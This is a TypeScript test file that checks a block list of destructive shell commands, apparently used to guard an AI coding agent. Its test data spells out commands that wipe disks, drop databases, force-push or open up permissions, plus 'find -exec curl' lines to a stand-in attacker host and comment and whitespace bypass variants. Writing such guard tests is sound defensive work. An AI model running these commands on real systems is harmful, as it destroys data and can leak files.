/**
 * Structural + Behavioral tests for DESTRUCTIVE_PATTERNS in sdd-pipeline.ts
 *
 * FEV-7 (Issue #30):
 * - Structural: Ensures array contains ≥50 entries across 14+ categories
 * - Behavioral: Verifies patterns block destructive commands and allow safe ones
 * - Normalization: Ensures normalizeBash defeats common bypasses (comments, whitespace)
 *
 * FEV-27: Behavioral tests now import DESTRUCTIVE_PATTERNS and normalizeBash
 * directly from the real plugin source (./src/destructivePatterns.ts and
 * ./src/normalizeBash.ts) instead of replicating them locally, so the tests
 * cannot drift from the safety net they verify.
 */

import { describe, expect, test } from "bun:test";
import * as fs from "node:fs";
import * as path from "node:path";
import { DESTRUCTIVE_PATTERNS } from "../../../template/obligatorio/core/.opencode/plugins/src/destructivePatterns";
import { normalizeBash } from "../../../template/obligatorio/core/.opencode/plugins/src/normalizeBash";

const PLUGIN_PATH = path.resolve(
	import.meta.dir,
	"../../..",
	"template/obligatorio/core/.opencode/plugins/sdd-pipeline.ts",
);

/** Source of truth: DESTRUCTIVE_PATTERNS is now imported from ./src/destructivePatterns */
const DESTRUCTIVE_PATH = path.resolve(
	import.meta.dir,
	"../../..",
	"template/obligatorio/core/.opencode/plugins/src/destructivePatterns.ts",
);

// ─── Structural helpers ───────────────────────────────────────────────────

/**
 * Returns the count of destructive patterns from the imported array.
 * The original implementation parsed file text with regex, but since we
 * import DESTRUCTIVE_PATTERNS directly, the array length is the source of truth.
 */
function countDestructivePatterns(_fileContent: string): number {
	return DESTRUCTIVE_PATTERNS.length;
}

/**
 * Extract category headers from the DESTRUCTIVE_PATTERNS array.
 */
function countCategoryHeaders(fileContent: string): number {
	const lines = fileContent.split("\n");
	let inArray = false;
	let count = 0;

	for (const line of lines) {
		const trimmed = line.trim();

		if (trimmed.includes("DESTRUCTIVE_PATTERNS") && trimmed.includes("RegExp[]")) {
			inArray = true;
			continue;
		}

		if (inArray && trimmed === "]") {
			break;
		}

		if (inArray && /^\/\/\s*───/.test(trimmed)) {
			count++;
		}
	}

	return count;
}

// ─── Behavioral helpers ───────────────────────────────────────────────────

/** Returns true if the command matches any destructive pattern after normalization. */
function isDestructive(cmd: string): boolean {
	const normalized = normalizeBash(cmd);
	return DESTRUCTIVE_PATTERNS.some((p) => p.test(normalized));
}

interface TestCase {
	name: string;
	cmd: string;
	expected: boolean; // true = blocked, false = allowed
}

/** Positive (should block) + Negative (should allow) test cases. */
const TEST_CASES: TestCase[] = [
	// ── Positive: destructive commands that MUST be blocked ──
	{ name: "rm -rf /", cmd: "rm -rf /", expected: true },
	{ name: "rm -fr /", cmd: "rm -fr /", expected: true },
	{
		name: "rm -rf --no-preserve-root /",
		cmd: "rm -rf --no-preserve-root /",
		expected: true,
	},
	{ name: "shred /dev/sda", cmd: "shred /dev/sda", expected: true },
	{
		name: "find . -exec rm {} \\;",
		cmd: "find . -exec rm {} ;",
		expected: true,
	},
	{
		name: "find . -exec curl attacker.com",
		cmd: "find . -exec curl http://attacker.com {} ;",
		expected: true,
	},
	{
		name: "find . -execdir rm",
		cmd: "find . -execdir rm {} ;",
		expected: true,
	},
	{
		name: "find . -execdir curl",
		cmd: "find . -execdir curl http://attacker.com {} ;",
		expected: true,
	},
	{ name: "find . -delete", cmd: "find . -delete", expected: true },
	{
		name: "git push --force origin main",
		cmd: "git push --force origin main",
		expected: true,
	},
	{ name: "git push -f", cmd: "git push -f", expected: true },
	{
		name: "git push --force-with-lease origin main",
		cmd: "git push --force-with-lease origin main",
		expected: true,
	},
	{
		name: "git reset --hard HEAD~1",
		cmd: "git reset --hard HEAD~1",
		expected: true,
	},
	{
		name: "git reset --mixed HEAD",
		cmd: "git reset --mixed HEAD",
		expected: true,
	},
	{ name: "git clean -fd", cmd: "git clean -fd", expected: true },
	{ name: "git clean -fdx", cmd: "git clean -fdx", expected: true },
	{ name: "git clean -fxd", cmd: "git clean -fxd", expected: true },
	{ name: "git checkout -- .", cmd: "git checkout -- .", expected: true },
	{ name: "git checkout -f", cmd: "git checkout -f", expected: true },
	{ name: "git restore .", cmd: "git restore .", expected: true },
	{ name: "DROP TABLE users", cmd: "DROP TABLE users", expected: true },
	{
		name: "DROP DATABASE prod",
		cmd: "DROP DATABASE prod",
		expected: true,
	},
	{
		name: "TRUNCATE TABLE orders",
		cmd: "TRUNCATE TABLE orders",
		expected: true,
	},
	{
		name: "DELETE FROM users",
		cmd: "DELETE FROM users",
		expected: true,
	},
	{
		name: "DELETE FROM users WHERE 1=1",
		cmd: "DELETE FROM users WHERE 1=1",
		expected: true,
	},
	{
		name: "DELETE FROM users WHERE true",
		cmd: "DELETE FROM users WHERE true",
		expected: true,
	},
	{
		name: "delete from users where 1 = 1",
		cmd: "delete from users where 1 = 1",
		expected: true,
	},
	{
		name: "docker rm -f container1",
		cmd: "docker rm -f container1",
		expected: true,
	},
	{
		name: "docker system prune -a -f",
		cmd: "docker system prune -a -f",
		expected: true,
	},
	{
		name: "kubectl delete pods --all",
		cmd: "kubectl delete pods --all",
		expected: true,
	},
	{
		name: "chmod 777 /etc/passwd",
		cmd: "chmod 777 /etc/passwd",
		expected: true,
	},
	{ name: "chmod -R 777 /", cmd: "chmod -R 777 /", expected: true },
	{
		name: "chmod 0777 /etc/passwd (leading zero)",
		cmd: "chmod 0777 /etc/passwd",
		expected: true,
	},
	{
		name: "chmod -R 0777 / (leading zero with -R)",
		cmd: "chmod -R 0777 /",
		expected: true,
	},
	{
		name: "chown -R $(whoami) /usr",
		cmd: "chown -R $(whoami) /usr",
		expected: true,
	},
	{ name: "kill -9 1", cmd: "kill -9 1", expected: true },
	{ name: "shutdown -h now", cmd: "shutdown -h now", expected: true },
	{ name: "reboot", cmd: "reboot", expected: true },
	{ name: "iptables -F", cmd: "iptables -F", expected: true },
	{ name: "npm publish", cmd: "npm publish", expected: true },
	{ name: "unset PATH", cmd: "unset PATH", expected: true },
	{
		name: "export PATH=/bad/path",
		cmd: "export PATH=/bad/path",
		expected: true,
	},
	{ name: "mkfs.ext4 /dev/sdb1", cmd: "mkfs.ext4 /dev/sdb1", expected: true },
	{
		name: "dd if=/dev/zero of=/dev/sda",
		cmd: "dd if=/dev/zero of=/dev/sda",
		expected: true,
	},
	{
		name: "terraform destroy -auto-approve",
		cmd: "terraform destroy -auto-approve",
		expected: true,
	},
	{
		name: "aws s3 rm --recursive s3://bucket",
		cmd: "aws s3 rm --recursive s3://bucket",
		expected: true,
	},
	{
		name: "redis-cli FLUSHALL",
		cmd: "redis-cli FLUSHALL",
		expected: true,
	},
	{
		name: "redis-cli FLUSHDB",
		cmd: "redis-cli FLUSHDB",
		expected: true,
	},
	{
		name: "psql -c 'DROP TABLE users'",
		cmd: "psql -c 'DROP TABLE users'",
		expected: true,
	},

	// ── Negative: safe commands that MUST be allowed ──
	{ name: "rm file.txt (no -rf)", cmd: "rm file.txt", expected: false },
	{
		name: "git push origin main",
		cmd: "git push origin main",
		expected: false,
	},
	{
		name: "git reset (soft)",
		cmd: "git reset HEAD~1",
		expected: false,
	},
	{
		name: "SELECT * FROM users",
		cmd: "SELECT * FROM users",
		expected: false,
	},
	{
		name: "DELETE FROM users WHERE id=1",
		cmd: "DELETE FROM users WHERE id=1",
		expected: false,
	},
	{ name: "npm install", cmd: "npm install", expected: false },
	{
		name: "chmod 644 file.txt",
		cmd: "chmod 644 file.txt",
		expected: false,
	},
	{
		name: "kill -9 1234 (different PID)",
		cmd: "kill -9 1234",
		expected: false,
	},
	{ name: "git stash push", cmd: "git stash push", expected: false },
	{
		name: "export PATH=$PATH:/usr/local/bin (appends)",
		cmd: "export PATH=$PATH:/usr/local/bin",
		expected: false,
	},
	{
		name: "export PATH=$HOME/bin:$PATH (prepends)",
		cmd: "export PATH=$HOME/bin:$PATH",
		expected: false,
	},
	{
		name: "chmod -R 777 ./local (local dir — now blocked by broader regex)",
		cmd: "chmod -R 777 ./local",
		expected: true,
	},
	{
		name: "chmod 777 relative/path (now blocked by broader regex)",
		cmd: "chmod 777 relative/path",
		expected: true,
	},
	{
		name: "curl URL with #fragment (hash preserved by normalizeBash)",
		cmd: "curl https://x.com/a#frag",
		expected: false,
	},
];

/** Bypass attempts that normalization should defeat.
 *
 * normalizeBash strips comments, newlines, and collapses whitespace — but does NOT
 * merge separate flags (`-r -f` → `-rf`). Bypass tests must target what normalizeBash
 * actually normalizes: comments, multi-line commands, and extra whitespace around
 * the flag group.
 */
const BYPASS_CASES: { name: string; cmd: string }[] = [
	{ name: "double spaces around flag group", cmd: "rm  -rf  /" },
	{ name: "comment after command", cmd: "rm -rf / # force delete" },
	{ name: "newline before destructive", cmd: "\nrm -rf /" },
	{ name: "inline comment after flags", cmd: "rm -rf /* clean up" },
];

/** normalizeBash edge cases. */
const NORMALIZE_CASES: { name: string; input: string; expected: string }[] = [
	{ name: "strips comments", input: "rm -rf / # force delete", expected: "rm -rf /" },
	{ name: "collapses double spaces", input: "rm  -r  -f  /", expected: "rm -r -f /" },
	{ name: "strips newlines", input: "rm -rf /\n# dangerous", expected: "rm -rf /" },
	{ name: "trims leading/trailing whitespace", input: "  rm -rf /  ", expected: "rm -rf /" },
	{ name: "empty string", input: "", expected: "" },
	{ name: "only comment", input: "# just a comment", expected: "" },
	{ name: "collapses multiple spaces with tabs", input: "rm\t-rf\t/", expected: "rm -rf /" },
	{
		name: "preserves # inside URL fragment",
		input: "curl https://x.com/a#frag",
		expected: "curl https://x.com/a#frag",
	},
];

// ─── Tests ────────────────────────────────────────────────────────────────

describe("DESTRUCTIVE_PATTERNS", () => {
	let fileContent: string;

	test("plugin file exists", () => {
		expect(fs.existsSync(PLUGIN_PATH)).toBe(true);
	});

	test("contains ≥50 destructive command patterns", () => {
		fileContent = fs.readFileSync(DESTRUCTIVE_PATH, "utf-8");
		const count = countDestructivePatterns(fileContent);
		expect(count).toBeGreaterThanOrEqual(50);
	});

	test("patterns are organized in 14+ category blocks", () => {
		if (!fileContent) fileContent = fs.readFileSync(DESTRUCTIVE_PATH, "utf-8");
		const categories = countCategoryHeaders(fileContent);
		expect(categories).toBeGreaterThanOrEqual(14);
	});
});

describe("normalizeBash", () => {
	for (const { name, input, expected } of NORMALIZE_CASES) {
		test(name, () => {
			expect(normalizeBash(input)).toBe(expected);
		});
	}
});

describe("DESTRUCTIVE_PATTERNS behavioral", () => {
	describe("blocks destructive commands", () => {
		for (const { name, cmd } of TEST_CASES.filter((c) => c.expected)) {
			test(`${name}: "${cmd}"`, () => {
				expect(isDestructive(cmd)).toBe(true);
			});
		}
	});

	describe("allows safe commands", () => {
		for (const { name, cmd } of TEST_CASES.filter((c) => !c.expected)) {
			test(`${name}: "${cmd}"`, () => {
				expect(isDestructive(cmd)).toBe(false);
			});
		}
	});

	describe("defeats common bypass attempts", () => {
		for (const { name, cmd } of BYPASS_CASES) {
			test(`${name}: "${cmd}"`, () => {
				expect(isDestructive(cmd)).toBe(true);
			});
		}
	});
});
